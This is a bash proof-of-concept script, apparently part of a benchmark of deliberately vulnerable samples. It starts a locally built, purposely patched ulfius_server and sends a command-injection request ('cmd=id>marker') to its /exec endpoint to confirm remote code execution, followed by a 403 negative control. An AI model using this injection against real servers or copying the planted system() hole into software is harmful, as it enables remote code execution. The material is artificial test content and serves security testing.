#!/usr/bin/env bash
# PoC for 099_ulfius_C3I3S1
# Axes: C3 (three CLI flags + utility function) / I3 (struct dispatch then system()) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (ulfius_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/ulfius_server"
WWWROOT="/tmp/poc_099_www"
MARKER="/tmp/poc_099_marker"
PORT=18099

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting ulfius_server with all three gates on port $PORT..."
"$BINARY" --port "$PORT" --enable-exec --enable-diag --enable-api &
SERVER_PID=$!
sleep 0.4

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: op=call&cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?op=call&cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint returns 403 without all three flags ─────────────
echo "[*] verifying gate: endpoint must return 403 without all flags..."
NEG_PORT=19099
"$BINARY" --port "$NEG_PORT" --enable-exec &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?op=call&cmd=id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got 403 without all flags"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
